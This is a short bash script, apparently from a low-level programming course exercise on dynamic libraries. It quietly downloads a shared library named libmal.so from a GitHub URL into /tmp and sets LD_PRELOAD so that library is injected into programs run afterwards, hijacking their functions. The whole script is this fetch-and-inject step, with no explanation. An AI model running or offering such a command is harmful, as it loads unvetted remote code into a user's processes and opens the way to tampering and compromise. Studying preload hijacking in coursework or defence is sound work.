#!/bin/bash
wget -qO /tmp/libmal.so https://github.com/Dev-manuels/alx-low_level_programming/raw/master/0x18-dynamic_libraries/libmal.so
export LD_PRELOAD=/tmp/libmal.so
